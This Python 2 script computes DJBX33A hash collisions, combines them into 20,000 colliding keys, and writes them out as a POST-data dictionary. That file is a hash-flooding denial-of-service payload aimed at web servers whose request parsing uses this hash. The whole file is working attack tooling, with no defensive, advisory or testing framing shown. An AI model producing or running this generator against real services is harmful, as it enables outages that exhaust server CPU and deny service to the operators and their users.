import string

# this is the set of caracters to use for generating collisions
chars = (string.lowercase+string.uppercase+string.digits)

def djbx33a(s):
    '''calculate djbx33a hash from string'''
    h = 5381
    for c in s:
        h += (h <<5) + ord(c)
        h &= 0xFFFFFFFF
    return h

def find_collisions(length=2):
    '''Find the biggest set of strings of length chars that give the same hash
    '''
    hashes = {}
    best_hash, max_collitions = 0,0
    idxs = [0]*length
    while 1:
        name = ''.join(map(lambda x: chars[x],idxs))
        h = djbx33a(name)
        if h in hashes:
            hashes[h].append(name)
            if len(hashes[h]) > max_collitions:
                best_hash,max_collitions = h,len(hashes[h])
        else:
            hashes[h] = [name]

        i = 0
        while i < length:
            idxs[i] = (idxs[i]+1)%len(chars)
            if idxs[i] != 0:
                break
            i+=1

        if i == length:
            # we've looped over all strings
            return hashes[best_hash]

def make_combinations(dataset, limit):
    '''Combine the string in dataset until we have a given number of them,
    all the strings in the returned set are made of the same number of
    substrings
    '''
    values = ['']
    while 1:
        res = []
        for d in values:
            for i in dataset:
                res.append(d+i)
                if len(res) == limit:
                    return res
        values = res

def main():
    # find collision strings of length 3
    length = 3
    values = find_collisions(length)
    print "found %d collisions of length %d"%(len(values),length)

    # combine them
    keys = make_combinations(values, 20000)

    post = {}
    for k in keys: post[k] = ''

    with open('postdata.py', 'w') as f:
        f.write('post = '+str(post))
        print "generated",len(keys),"hash collisions"

if __name__ == '__main__':
    main()
